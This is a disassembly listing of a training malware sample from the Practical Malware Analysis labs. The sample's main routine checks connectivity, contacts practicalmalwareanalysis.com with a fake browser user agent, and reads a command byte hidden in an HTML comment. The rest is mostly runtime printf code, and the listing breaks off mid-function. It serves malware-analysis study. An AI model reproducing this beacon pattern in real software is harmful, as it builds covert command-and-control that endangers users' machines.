.text:00401000 ;
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ; ¦     This file is generated by The Interactive Disassembler (IDA)        ¦
.text:00401000 ; ¦     Copyright (c) 2010 by Hex-Rays SA, <support@hex-rays.com>           ¦
.text:00401000 ; ¦                      Licensed to: Freeware version                      ¦
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ;
.text:00401000 ; Input MD5   : C0B54534E188E1392F28D17FAFF3D454
.text:00401000
.text:00401000 ; File Name   : C:\Users\bturi01\Downloads\PracticalMalwareAnalysis-Labs\Practical Malware Analysis Labs\BinaryCollection\Chapter_6L\Lab06-02.exe
.text:00401000 ; Format      : Portable executable for 80386 (PE)
.text:00401000 ; Imagebase   : 400000
.text:00401000 ; Section 1. (virtual address 00001000)
.text:00401000 ; Virtual size                  : 00004A78 (  19064.)
.text:00401000 ; Section size in file          : 00005000 (  20480.)
.text:00401000 ; Offset to raw data for section: 00001000
.text:00401000 ; Flags 60000020: Text Executable Readable
.text:00401000 ; Alignment     : default
.text:00401000 ; OS type         :  MS Windows
.text:00401000 ; Application type:  Executable 32bit
.text:00401000
.text:00401000
.text:00401000 unicode         macro page,string,zero
.text:00401000                 irpc c,<string>
.text:00401000                 db '&c', page
.text:00401000                 endm
.text:00401000                 ifnb <zero>
.text:00401000                 dw zero
.text:00401000                 endif
.text:00401000 endm
.text:00401000
.text:00401000                 .686p
.text:00401000                 .mmx
.text:00401000                 .model flat
.text:00401000
.text:00401000 ; ---------------------------------------------------------------------------
.text:00401000
.text:00401000 ; Segment type: Pure code
.text:00401000 ; Segment permissions: Read/Execute
.text:00401000 _text           segment para public 'CODE' use32
.text:00401000                 assume cs:_text
.text:00401000                 ;org 401000h
.text:00401000                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.text:00401000
.text:00401000 ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:00401000
.text:00401000 ; Attributes: bp-based frame
.text:00401000
.text:00401000 sub_401000      proc near               ; CODE XREF: _main+6p
.text:00401000
.text:00401000 var_4           = dword ptr -4
.text:00401000
.text:00401000                 push    ebp
.text:00401001                 mov     ebp, esp
.text:00401003                 push    ecx
.text:00401004                 push    0               ; dwReserved
.text:00401006                 push    0               ; lpdwFlags
.text:00401008                 call    ds:InternetGetConnectedState
.text:0040100E                 mov     [ebp+var_4], eax
.text:00401011                 cmp     [ebp+var_4], 0
.text:00401015                 jz      short loc_40102B
.text:00401017                 push    offset aSuccessInterne ; "Success: Internet Connection\n"
.text:0040101C                 call    sub_40117F
.text:00401021                 add     esp, 4
.text:00401024                 mov     eax, 1
.text:00401029                 jmp     short loc_40103A
.text:0040102B ; ---------------------------------------------------------------------------
.text:0040102B
.text:0040102B loc_40102B:                             ; CODE XREF: sub_401000+15j
.text:0040102B                 push    offset aError1_1NoInte ; "Error 1.1: No Internet\n"
.text:00401030                 call    sub_40117F
.text:00401035                 add     esp, 4
.text:00401038                 xor     eax, eax
.text:0040103A
.text:0040103A loc_40103A:                             ; CODE XREF: sub_401000+29j
.text:0040103A                 mov     esp, ebp
.text:0040103C                 pop     ebp
.text:0040103D                 retn
.text:0040103D sub_401000      endp
.text:0040103D
.text:0040103D ; ---------------------------------------------------------------------------
.text:0040103E                 align 10h
.text:00401040
.text:00401040 ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:00401040
.text:00401040 ; Attributes: bp-based frame
.text:00401040
.text:00401040 sub_401040      proc near               ; CODE XREF: _main:loc_401148p
.text:00401040
.text:00401040 Buffer          = dword ptr -210h
.text:00401040 var_20C         = byte ptr -20Ch
.text:00401040 hFile           = dword ptr -10h
.text:00401040 hInternet       = dword ptr -0Ch
.text:00401040 dwNumberOfBytesRead= dword ptr -8
.text:00401040 var_4           = dword ptr -4
.text:00401040
.text:00401040                 push    ebp
.text:00401041                 mov     ebp, esp
.text:00401043                 sub     esp, 210h
.text:00401049                 push    0               ; dwFlags
.text:0040104B                 push    0               ; lpszProxyBypass
.text:0040104D                 push    0               ; lpszProxy
.text:0040104F                 push    0               ; dwAccessType
.text:00401051                 push    offset szAgent  ; "Internet Explorer 7.5/pma"
.text:00401056                 call    ds:InternetOpenA
.text:0040105C                 mov     [ebp+hInternet], eax
.text:0040105F                 push    0               ; dwContext
.text:00401061                 push    0               ; dwFlags
.text:00401063                 push    0               ; dwHeadersLength
.text:00401065                 push    0               ; lpszHeaders
.text:00401067                 push    offset szUrl    ; "http://www.practicalmalwareanalysis.com"...
.text:0040106C                 mov     eax, [ebp+hInternet]
.text:0040106F                 push    eax             ; hInternet
.text:00401070                 call    ds:InternetOpenUrlA
.text:00401076                 mov     [ebp+hFile], eax
.text:00401079                 cmp     [ebp+hFile], 0
.text:0040107D                 jnz     short loc_40109D
.text:0040107F                 push    offset aError2_1FailTo ; "Error 2.1: Fail to OpenUrl\n"
.text:00401084                 call    sub_40117F
.text:00401089                 add     esp, 4
.text:0040108C                 mov     ecx, [ebp+hInternet]
.text:0040108F                 push    ecx             ; hInternet
.text:00401090                 call    ds:InternetCloseHandle
.text:00401096                 xor     al, al
.text:00401098                 jmp     loc_40112C
.text:0040109D ; ---------------------------------------------------------------------------
.text:0040109D
.text:0040109D loc_40109D:                             ; CODE XREF: sub_401040+3Dj
.text:0040109D                 lea     edx, [ebp+dwNumberOfBytesRead]
.text:004010A0                 push    edx             ; lpdwNumberOfBytesRead
.text:004010A1                 push    200h            ; dwNumberOfBytesToRead
.text:004010A6                 lea     eax, [ebp+Buffer]
.text:004010AC                 push    eax             ; lpBuffer
.text:004010AD                 mov     ecx, [ebp+hFile]
.text:004010B0                 push    ecx             ; hFile
.text:004010B1                 call    ds:InternetReadFile
.text:004010B7                 mov     [ebp+var_4], eax
.text:004010BA                 cmp     [ebp+var_4], 0
.text:004010BE                 jnz     short loc_4010E5
.text:004010C0                 push    offset aError2_2FailTo ; "Error 2.2: Fail to ReadFile\n"
.text:004010C5                 call    sub_40117F
.text:004010CA                 add     esp, 4
.text:004010CD                 mov     edx, [ebp+hInternet]
.text:004010D0                 push    edx             ; hInternet
.text:004010D1                 call    ds:InternetCloseHandle
.text:004010D7                 mov     eax, [ebp+hFile]
.text:004010DA                 push    eax             ; hInternet
.text:004010DB                 call    ds:InternetCloseHandle
.text:004010E1                 xor     al, al
.text:004010E3                 jmp     short loc_40112C
.text:004010E5 ; ---------------------------------------------------------------------------
.text:004010E5
.text:004010E5 loc_4010E5:                             ; CODE XREF: sub_401040+7Ej
.text:004010E5                 movsx   ecx, byte ptr [ebp+Buffer]
.text:004010EC                 cmp     ecx, 3Ch
.text:004010EF                 jnz     short loc_40111D
.text:004010F1                 movsx   edx, byte ptr [ebp+Buffer+1]
.text:004010F8                 cmp     edx, 21h
.text:004010FB                 jnz     short loc_40111D
.text:004010FD                 movsx   eax, byte ptr [ebp+Buffer+2]
.text:00401104                 cmp     eax, 2Dh
.text:00401107                 jnz     short loc_40111D
.text:00401109                 movsx   ecx, byte ptr [ebp+Buffer+3]
.text:00401110                 cmp     ecx, 2Dh
.text:00401113                 jnz     short loc_40111D
.text:00401115                 mov     al, [ebp+var_20C]
.text:0040111B                 jmp     short loc_40112C
.text:0040111D ; ---------------------------------------------------------------------------
.text:0040111D
.text:0040111D loc_40111D:                             ; CODE XREF: sub_401040+AFj
.text:0040111D                                         ; sub_401040+BBj ...
.text:0040111D                 push    offset aError2_3FailTo ; "Error 2.3: Fail to get command\n"
.text:00401122                 call    sub_40117F
.text:00401127                 add     esp, 4
.text:0040112A                 xor     al, al
.text:0040112C
.text:0040112C loc_40112C:                             ; CODE XREF: sub_401040+58j
.text:0040112C                                         ; sub_401040+A3j ...
.text:0040112C                 mov     esp, ebp
.text:0040112E                 pop     ebp
.text:0040112F                 retn
.text:0040112F sub_401040      endp
.text:0040112F
.text:00401130
.text:00401130 ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:00401130
.text:00401130 ; Attributes: bp-based frame
.text:00401130
.text:00401130 ; int __cdecl main(int argc,const char **argv,const char *envp)
.text:00401130 _main           proc near               ; CODE XREF: start+AFp
.text:00401130
.text:00401130 var_8           = byte ptr -8
.text:00401130 var_4           = dword ptr -4
.text:00401130 argc            = dword ptr  8
.text:00401130 argv            = dword ptr  0Ch
.text:00401130 envp            = dword ptr  10h
.text:00401130
.text:00401130                 push    ebp
.text:00401131                 mov     ebp, esp
.text:00401133                 sub     esp, 8
.text:00401136                 call    sub_401000
.text:0040113B                 mov     [ebp+var_4], eax
.text:0040113E                 cmp     [ebp+var_4], 0
.text:00401142                 jnz     short loc_401148
.text:00401144                 xor     eax, eax
.text:00401146                 jmp     short loc_40117B
.text:00401148 ; ---------------------------------------------------------------------------
.text:00401148
.text:00401148 loc_401148:                             ; CODE XREF: _main+12j
.text:00401148                 call    sub_401040
.text:0040114D                 mov     [ebp+var_8], al
.text:00401150                 movsx   eax, [ebp+var_8]
.text:00401154                 test    eax, eax
.text:00401156                 jnz     short loc_40115C
.text:00401158                 xor     eax, eax
.text:0040115A                 jmp     short loc_40117B
.text:0040115C ; ---------------------------------------------------------------------------
.text:0040115C
.text:0040115C loc_40115C:                             ; CODE XREF: _main+26j
.text:0040115C                 movsx   ecx, [ebp+var_8]
.text:00401160                 push    ecx
.text:00401161                 push    offset aSuccessParsedC ; "Success: Parsed command is %c\n"
.text:00401166                 call    sub_40117F
.text:0040116B                 add     esp, 8
.text:0040116E                 push    0EA60h          ; dwMilliseconds
.text:00401173                 call    ds:Sleep
.text:00401179                 xor     eax, eax
.text:0040117B
.text:0040117B loc_40117B:                             ; CODE XREF: _main+16j
.text:0040117B                                         ; _main+2Aj
.text:0040117B                 mov     esp, ebp
.text:0040117D                 pop     ebp
.text:0040117E                 retn
.text:0040117E _main           endp
.text:0040117E
.text:0040117F
.text:0040117F ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:0040117F
.text:0040117F
.text:0040117F sub_40117F      proc near               ; CODE XREF: sub_401000+1Cp
.text:0040117F                                         ; sub_401000+30p ...
.text:0040117F
.text:0040117F arg_0           = dword ptr  0Ch
.text:0040117F arg_4           = dword ptr  10h
.text:0040117F
.text:0040117F                 push    ebx
.text:00401180                 push    esi
.text:00401181                 mov     esi, offset unk_407160
.text:00401186                 push    edi
.text:00401187                 push    esi
.text:00401188                 call    __stbuf
.text:0040118D                 mov     edi, eax
.text:0040118F                 lea     eax, [esp+8+arg_4]
.text:00401193                 push    eax             ; int
.text:00401194                 push    [esp+0Ch+arg_0] ; int
.text:00401198                 push    esi             ; FILE *
.text:00401199                 call    sub_4013A2
.text:0040119E                 push    esi
.text:0040119F                 push    edi
.text:004011A0                 mov     ebx, eax
.text:004011A2                 call    __ftbuf
.text:004011A7                 add     esp, 18h
.text:004011AA                 mov     eax, ebx
.text:004011AC                 pop     edi
.text:004011AD                 pop     esi
.text:004011AE                 pop     ebx
.text:004011AF                 retn
.text:004011AF sub_40117F      endp
.text:004011AF
.text:004011B0 ; [000000D4 BYTES: COLLAPSED FUNCTION start. PRESS KEYPAD "+" TO EXPAND]
.text:00401284 ; ---------------------------------------------------------------------------
.text:00401284                 mov     esp, [ebp-18h]
.text:00401287                 push    dword ptr [ebp-20h]
.text:0040128A                 call    __exit
.text:0040128F ; [00000025 BYTES: COLLAPSED FUNCTION __amsg_exit. PRESS KEYPAD "+" TO EXPAND]
.text:004012B4 ; [00000024 BYTES: COLLAPSED FUNCTION _fast_error_exit. PRESS KEYPAD "+" TO EXPAND]
.text:004012D8 ; [0000008D BYTES: COLLAPSED FUNCTION __stbuf. PRESS KEYPAD "+" TO EXPAND]
.text:00401365 ; [0000003D BYTES: COLLAPSED FUNCTION __ftbuf. PRESS KEYPAD "+" TO EXPAND]
.text:004013A2
.text:004013A2 ; ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ S U B R O U T I N E ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦
.text:004013A2
.text:004013A2 ; Attributes: bp-based frame
.text:004013A2
.text:004013A2 ; int __cdecl sub_4013A2(FILE *,int,int)
.text:004013A2 sub_4013A2      proc near               ; CODE XREF: sub_40117F+1Ap
.text:004013A2
.text:004013A2 var_24C         = byte ptr -24Ch
.text:004013A2 var_4C          = dword ptr -4Ch
.text:004013A2 var_48          = dword ptr -48h
.text:004013A2 var_44          = dword ptr -44h
.text:004013A2 var_40          = dword ptr -40h
.text:004013A2 var_3C          = dword ptr -3Ch
.text:004013A2 var_38          = dword ptr -38h
.text:004013A2 var_34          = dword ptr -34h
.text:004013A2 var_30          = dword ptr -30h
.text:004013A2 var_2C          = dword ptr -2Ch
.text:004013A2 var_28          = dword ptr -28h
.text:004013A2 var_24          = dword ptr -24h
.text:004013A2 var_20          = dword ptr -20h
.text:004013A2 var_1C          = dword ptr -1Ch
.text:004013A2 var_16          = dword ptr -16h
.text:004013A2 var_10          = dword ptr -10h
.text:004013A2 var_C           = dword ptr -0Ch
.text:004013A2 var_8           = dword ptr -8
.text:004013A2 var_4           = dword ptr -4
.text:004013A2 arg_0           = dword ptr  8
.text:004013A2 arg_4           = dword ptr  0Ch
.text:004013A2 arg_8           = dword ptr  10h
.text:004013A2
.text:004013A2                 push    ebp
.text:004013A3                 mov     ebp, esp
.text:004013A5                 sub     esp, 24Ch
.text:004013AB                 push    ebx
.text:004013AC                 push    esi
.text:004013AD                 mov     esi, [ebp+arg_4]
.text:004013B0                 xor     ecx, ecx
.text:004013B2                 push    edi
.text:004013B3                 mov     [ebp+var_10], ecx
.text:004013B6                 mov     bl, [esi]
.text:004013B8                 inc     esi
.text:004013B9                 test    bl, bl
.text:004013BB                 mov     [ebp+var_16+2], ecx
.text:004013BE                 mov     [ebp+var_30], ecx
.text:004013C1                 mov     [ebp+arg_4], esi
.text:004013C4                 jz      loc_401B18
.text:004013CA                 mov     edi, 800h
.text:004013CF                 mov     edx, 200h
.text:004013D4                 jmp     short loc_4013E3
.text:004013D6 ; ---------------------------------------------------------------------------
.text:004013D6
.text:004013D6 loc_4013D6:                             ; CODE XREF: sub_4013A2+770j
.text:004013D6                 mov     ecx, [ebp+var_3C]
.text:004013D9                 mov     edx, 200h
.text:004013DE                 mov     edi, 800h
.text:004013E3
.text:004013E3 loc_4013E3:                             ; CODE XREF: sub_4013A2+32j
.text:004013E3                 cmp     [ebp+var_16+2], 0
.text:004013E7                 jl      loc_401B18
.text:004013ED                 cmp     bl, 20h
.text:004013F0                 jl      short loc_401405
.text:004013F2                 cmp     bl, 78h
.text:004013F5                 jg      short loc_401405
.text:004013F7                 movsx   eax, bl
.text:004013FA                 mov     al, byte ptr ds:InternetReadFile[eax]
.text:00401400                 and     eax, 0Fh
.text:00401403                 jmp     short loc_401407
.text:00401405 ; ---------------------------------------------------------------------------
.text:00401405
.text:00401405 loc_401405:                             ; CODE XREF: sub_4013A2+4Ej
.text:00401405                                         ; sub_4013A2+53j
.text:00401405                 xor     eax, eax
.text:00401407
.text:00401407 loc_401407:                             ; CODE XREF: sub_4013A2+61j
.text:00401407                 movsx   eax, ds:byte_4060DC[ecx+eax*8]
.text:0040140F                 sar     eax, 4
.text:00401412                 cmp     eax, 7
.text:00401415                 mov     [ebp+var_3C], eax
.text:00401418                 ja      loc_401B07
.text:0040141E                 jmp     ds:off_401B20[eax*4]
.text:00401425
.text:00401425 loc_401425:                             ; DATA XREF: .text:00401B24o
.text:00401425                 xor     eax, eax
.text:00401427                 or      [ebp+var_8], 0FFFFFFFFh
.text:0040142B                 mov     [ebp+var_40], eax
.text:0040142E                 mov     [ebp+var_38], eax
.text:00401431                 mov     [ebp+var_28], eax
.text:00401434                 mov     [ebp+var_24], eax
.text:00401437                 mov     [ebp+var_4], eax
.text:0040143A                 mov     [ebp+var_2C], eax
.text:0040143D                 jmp     loc_401B07
.text:00401442 ; ---------------------------------------------------------------------------
.text:00401442
.text:00401442 loc_401442:                             ; CODE XREF: sub_4013A2+7Cj
.text:00401442                                         ; DATA XREF: .text:00401B28o
.text:00401442                 movsx   eax, bl
.text:00401445                 sub     eax, 20h
.text:00401448                 jz      short loc_401485
.text:0040144A                 sub     eax, 3
.text:0040144D                 jz      short loc_40147C
.text:0040144F                 sub     eax, 8
.text:00401452                 jz      short loc_401473
.text:00401454                 dec     eax
.text:00401455                 dec     eax
.text:00401456                 jz      short loc_40146A
.text:00401458                 sub     eax, 3
.text:0040145B                 jnz     loc_401B07
.text:00401461                 or      [ebp+var_4], 8
.text:00401465                 jmp     loc_401B07
.text:0040146A ; ---------------------------------------------------------------------------
.text:0040146A
.text:0040146A loc_40146A:                             ; CODE XREF: sub_4013A2+B4j
.text:0040146A                 or      [ebp+var_4], 4
.text:0040146E                 jmp     loc_401B07
.text:00401473 ; ---------------------------------------------------------------------------
.text:00401473
.text:00401473 loc_401473:                             ; CODE XREF: sub_4013A2+B0j
.text:00401473                 or      [ebp+var_4], 1
.text:00401477                 jmp     loc_401B07
.text:0040147C ; ---------------------------------------------------------------------------
.text:0040147C
.text:0040147C loc_40147C:                             ; CODE XREF: sub_4013A2+ABj
.text:0040147C                 or      byte ptr [ebp+var_4], 80h
.text:00401480                 jmp     loc_401B07
.text:00401485 ; ---------------------------------------------------------------------------
.text:00401485
.text:00401485 loc_401485:                             ; CODE XREF: sub_4013A2+A6j
.text:00401485                 or      [ebp+var_4], 2
.text:00401489                 jmp     loc_401B07
.text:0040148E ; ---------------------------------------------------------------------------
.text:0040148E
.text:0040148E loc_40148E:                             ; CODE XREF: sub_4013A2+7Cj
.text:0040148E                                         ; DATA XREF: .text:00401B2Co
.text:0040148E                 cmp     bl, 2Ah
.text:00401491                 jnz     short loc_4014B6
.text:00401493                 lea     eax, [ebp+arg_8]
.text:00401496                 push    eax
.text:00401497                 call    _get_int_arg
.text:0040149C                 test    eax, eax
.text:0040149E                 pop     ecx
.text:0040149F                 mov     [ebp+var_28], eax
.text:004014A2                 jge     loc_401B07
.text:004014A8                 or      [ebp+var_4], 4
.text:004014AC                 neg     eax
.text:004014AE
.text:004014AE loc_4014AE:                             ; CODE XREF: sub_4013A2+121j
.text:004014AE                 mov     [ebp+var_28], eax
.text:004014B1                 jmp     loc_401B07
.text:004014B6 ; ---------------------------------------------------------------------------
.text:004014B6
.text:004014B6 loc_4014B6:                             ; CODE XREF: sub_4013A2+EFj
.text:004014B6                 mov     eax, [ebp+var_28]
.text:004014B9                 movsx   ecx, bl
.text:004014BC                 lea     eax, [eax+eax*4]
.text:004014BF                 lea     eax, [ecx+eax*2-30h]
.text:004014C3                 jmp     short loc_4014AE
.text:004014C5 ; ---------------------------------------------------------------------------
.text:004014C5
.text:004014C5 loc_4014C5:                             ; CODE XREF: sub_4013A2+7Cj
.text:004014C5                                         ; DATA XREF: .text:00401B30o
.text:004014C5                 and     [ebp+var_8], 0
.text:004014C9                 jmp     loc_401B07
.text:004014CE ; ---------------------------------------------------------------------------
.text:004014CE
.text:004014CE loc_4014CE:                             ; CODE XREF: sub_4013A2+7Cj
.text:004014CE                                         ; DATA XREF: .text:00401B34o
.text:004014CE                 cmp     bl, 2Ah
.text:004014D1                 jnz     short loc_4014F1
.text:004014D3                 lea     eax, [ebp+arg_8]
.text:004014D6                 push    eax
.text:004014D7                 call    _get_int_arg
.text:004014DC                 test    eax, eax
.text:004014DE                 pop     ecx
.text:004014DF                 mov     [ebp+var_8], eax
.text:004014E2                 jge     loc_401B07
.text:004014E8                 or      [ebp+var_8], 0FFFFFFFFh
.text:004014EC                 jmp     loc_401B07
.text:004014F1 ; ---------------------------------------------------------------------------
.text:004014F1
.text:004014F1 loc_4014F1:                             ; CODE XREF: sub_4013A2+12Fj
.text:004014F1                 mov     eax, [ebp+var_8]
.text:004014F4                 movsx   ecx, bl
.text:004014F7                 lea     eax, [eax+eax*4]
.text:004014FA                 lea     eax, [ecx+eax*2-30h]
.text:004014FE                 mov     [ebp+var_8], eax
.text:00401501                 jmp     loc_401B07
.text:00401506 ; ---------------------------------------------------------------------------
.text:00401506
.text:00401506 loc_401506:                             ; CODE XREF: sub_4013A2+7Cj
.text:00401506                                         ; DATA XREF: .text:00401B38o
.text:00401506                 cmp     bl, 49h
.text:00401509                 jz      short loc_401538
.text:0040150B                 cmp     bl, 68h
.text:0040150E                 jz      short loc_40152F
.text:00401510                 cmp     bl, 6Ch
.text:00401513                 jz      short loc_401526
.text:00401515                 cmp     bl, 77h
.text:00401518                 jnz     loc_401B07
.text:0040151E                 or      [ebp+var_4], edi
.text:00401521                 jmp     loc_401B07
.text:00401526 ; ---------------------------------------------------------------------------
.text:00401526
.text:00401526 loc_401526:                             ; CODE XREF: sub_4013A2+171j
.text:00401526                 or      [ebp+var_4], 10h
.text:0040152A                 jmp     loc_401B07
.text:0040152F ; ---------------------------------------------------------------------------
.text:0040152F
.text:0040152F loc_40152F:                             ; CODE XREF: sub_4013A2+16Cj
.text:0040152F                 or      [ebp+var_4], 20h
.text:00401533                 jmp     loc_401B07
.text:00401538 ; ---------------------------------------------------------------------------
.text:00401538
.text:00401538 loc_401538:                             ; CODE XREF: sub_4013A2+167j
.text:00401538                 cmp     byte ptr [esi], 36h
.text:0040153B                 jnz     short loc_401551
.text:0040153D                 cmp     byte ptr [esi+1], 34h
.text:00401541                 jnz     short loc_401551
.text:00401543                 inc     esi
.text:00401544                 inc     esi
.text:00401545                 or      byte ptr [ebp+var_4+1], 80h
.text:00401549                 mov     [ebp+arg_4], esi
.text:0040154C                 jmp     loc_401B07
.text:00401551 ; ---------------------------------------------------------------------------
.text:00401551
.text:00401551 loc_401551:                             ; CODE XREF: sub_4013A2+199j
.text:00401551                                         ; sub_4013A2+19Fj
.text:00401551                 and     [ebp+var_3C], 0
.text:00401555
.text:00401555 loc_401555:                             ; CODE XREF: sub_4013A2+7Cj
.text:00401555                                         ; DATA XREF: .text:off_401B20o
.text:00401555                 mov     ecx, off_407518
.text:0040155B                 and     [ebp+var_2C], 0
.text:0040155F                 movzx   eax, bl
.text:00401562                 test    byte ptr [ecx+eax*2+1], 80h
.text:00401567                 jz      short loc_401582
.text:00401569                 lea     eax, [ebp+var_16+2]
.text:0040156C                 push    eax             ; int
.text:0040156D                 push    [ebp+arg_0]     ; FILE *
.text:00401570                 movsx   eax, bl
.text:00401573                 push    eax             ; int
.text:00401574                 call    _write_char
.text:00401579                 mov     bl, [esi]
.text:0040157B                 add     esp, 0Ch
.text:0040157E                 inc     esi
.text:0040157F                 mov     [ebp+arg_4], esi
.text:00401582
.text:00401582 loc_401582:                             ; CODE XREF: sub_4013A2+1C5j
.text:00401582                 lea     eax, [ebp+var_16+2]
.text:00401585                 push    eax             ; int
.text:00401586                 push    [ebp+arg_0]     ; FILE *
.text:00401589                 movsx   eax, bl
.text:0040158C                 push    eax             ; int
.text:0040158D                 call    _write_char
.text:00401592                 add     esp, 0Ch
.text:00401595                 jmp     loc_401B07
.text:0040159A ; ---------------------------------------------------------------------------
.text:0040159A
.text:0040159A loc_40159A:                             ; CODE XREF: sub_4013A2+7Cj
.text:0040159A                                         ; DATA XREF: .text:00401B3Co
.text:0040159A                 movsx   eax, bl
.text:0040159D                 cmp     eax, 67h
.text:004015A0                 jg      loc_4017DE
.text:004015A6                 cmp     eax, 65h
.text:004015A9                 jge     loc_401645
.text:004015AF                 cmp     eax, 58h
.text:004015B2                 jg      loc_4016A4
.text:004015B8                 jz      loc_401852
.text:004015BE                 sub     eax, 43h
.text:004015C1                 jz      loc_401668
.text:004015C7                 dec     eax
.text:004015C8                 dec     eax
.text:004015C9                 jz      short loc_40163B
.text:004015CB                 dec     eax
.text:004015CC                 dec     eax
.text:004015CD                 jz      short loc_40163B
.text:004015CF                 sub     eax, 0Ch
.text:004015D2                 jnz     loc_4019F6
.text:004015D8                 test    word ptr [ebp+var_4], 830h
.text:004015DE                 jnz     short loc_4015E3
.text:004015E0                 or      [ebp+var_4], edi
.text:004015E3
.text:004015E3 loc_4015E3:                             ; CODE XREF: sub_4013A2+23Cj
.text:004015E3                                         ; sub_4013A2+45Bj
.text:004015E3                 cmp     [ebp+var_8], 0FFFFFFFFh
.text:004015E7                 mov     esi, 7FFFFFFFh
.text:004015EC                 jz      short loc_4015F1
.text:004015EE                 mov     esi, [ebp+var_8]
.text:004015F1
.text:004015F1 loc_4015F1:                             ; CODE XREF: sub_4013A2+24Aj
.text:004015F1                 lea     eax, [ebp+arg_8]
.text:004015F4                 push    eax
.text:004015F5                 call    _get_int_arg
.text:004015FA                 test    word ptr [ebp+var_4], 810h
.text:00401600                 pop     ecx
.text:00401601                 mov     ecx, eax
.text:00401603                 mov     [ebp+var_C], ecx
.text:00401606                 jz      loc_401826
.text:0040160C                 test    ecx, ecx
.text:0040160E                 jnz     short loc_401619
.text:00401610                 mov     ecx, off_40713C
.text:00401616                 mov     [ebp+var_C], ecx
.text:00401619
.text:00401619 loc_401619:                             ; CODE XREF: sub_4013A2+26Cj
.text:00401619                 mov     [ebp+var_2C], 1
.text:00401620                 mov     eax, ecx
.text:00401622
.text:00401622 loc_401622:                             ; CODE XREF: sub_4013A2+297j
.text:00401622                 mov     edx, esi
.text:00401624                 dec     esi
.text:00401625                 test    edx, edx
.text:00401627                 jz      loc_40181D
.text:0040162D                 cmp     word ptr [eax], 0
.text:00401631                 jz      loc_40181D
.text:00401637                 inc     eax
.text:00401638                 inc     eax
.text:00401639                 jmp     short loc_401622
.text:0040163B ; ---------------------------------------------------------------------------
.text:0040163B
.text:0040163B loc_40163B:                             ; CODE XREF: sub_4013A2+227j
.text:0040163B                                         ; sub_4013A2+22Bj
.text:0040163B                 mov     [ebp+var_40], 1
.text:00401642                 add     bl, 20h
.text:00401645
.text:00401645 loc_401645:                             ; CODE XREF: sub_4013A2+207j
.text:00401645                 or      [ebp+var_4], 40h
.text:00401649                 cmp     [ebp+var_8], 0
.text:0040164D                 lea     edi, [ebp+var_24C]
.text:00401653                 mov     [ebp+var_C], edi
.text:00401656                 jge     loc_401729
.text:0040165C                 mov     [ebp+var_8], 6
.text:00401663                 jmp     loc_40176E
.text:00401668 ; ---------------------------------------------------------------------------
.text:00401668
.text:00401668 loc_401668:                             ; CODE XREF: sub_4013A2+21Fj
.text:00401668                 test    word ptr [ebp+var_4], 830h
.text:0040166E                 jnz     short loc_401673
.text:00401670                 or      [ebp+var_4], edi
.text:00401673
.text:00401673 loc_401673:                             ; CODE XREF: sub_4013A2+2CCj
.text:00401673                                         ; sub_4013A2+30Aj
.text:00401673                 test    word ptr [ebp+var_4], 810h
.text:00401679                 lea     eax, [ebp+arg_8]
.text:0040167C                 push    eax
.text:0040167D                 jz      short loc_4016BA
.text:0040167F                 call    _get_short_arg
.text:00401684                 push    eax             ; wchar_t
.text:00401685                 lea     eax, [ebp+var_24C]
.text:0040168B                 push    eax             ; char *
.text:0040168C                 call    _wctomb
.text:00401691                 add     esp, 0Ch
.text:00401694                 mov     [ebp+var_10], eax
.text:00401697                 test    eax, eax
.text:00401699                 jge     short loc_4016CD
.text:0040169B                 mov     [ebp+var_38], 1
.text:004016A2                 jmp     short loc_4016CD
.text:004016A4 ; ---------------------------------------------------------------------------
.text:004016A4
.text:004016A4 loc_4016A4:                             ; CODE XREF: sub_4013A2+210j
.text:004016A4                 sub     eax, 5Ah
.text:004016A7                 jz      short loc_4016DB
.text:004016A9                 sub     eax, 9
.text:004016AC                 jz      short loc_401673
.text:004016AE                 dec     eax
.text:004016AF                 jz      loc_4018B7
.text:004016B5                 jmp     loc_4019F6
.text:004016BA ; ---------------------------------------------------------------------------
.text:004016BA
.text:004016BA loc_4016BA:                             ; CODE XREF: sub_4013A2+2DBj
.text:004016BA                 call    _get_int_arg
.text:004016BF                 pop     ecx
.text:004016C0                 mov     [ebp+var_24C], al
.text:004016C6                 mov     [ebp+var_10], 1
.text:004016CD
.text:004016CD loc_4016CD:                             ; CODE XREF: sub_4013A2+2F7j
.text:004016CD                                         ; sub_4013A2+300j
.text:004016CD                 lea     eax, [ebp+var_24C]
.text:004016D3                 mov     [ebp+var_C], eax
.text:004016D6                 jmp     loc_4019F6
.text:004016DB ; ---------------------------------------------------------------------------
.text:004016DB
.text:004016DB loc_4016DB:                             ; CODE XREF: sub_4013A2+305j
.text:004016DB                 lea     eax, [ebp+arg_8]
.text:004016DE                 push    eax
.text:004016DF                 call    _get_int_arg
.text:004016E4                 test    eax, eax
.text:004016E6                 pop     ecx
.text:004016E7                 jz      short loc_40171B
.text:004016E9                 mov     ecx, [eax+4]
.text:004016EC                 test    ecx, ecx
.text:004016EE                 jz      short loc_40171B
.text:004016F0                 test    [ebp+var_4], edi
.text:004016F3                 jz      short loc_40170C
.text:004016F5                 movsx   eax, word ptr [eax]
.text:004016F8                 shr     eax, 1
.text:004016FA                 mov     [ebp+var_C], ecx
.text:004016FD                 mov     [ebp+var_10], eax
.text:00401700                 mov     [ebp+var_2C], 1
.text:00401707                 jmp     loc_4019F6
.text:0040170C ; ---------------------------------------------------------------------------
.text:0040170C
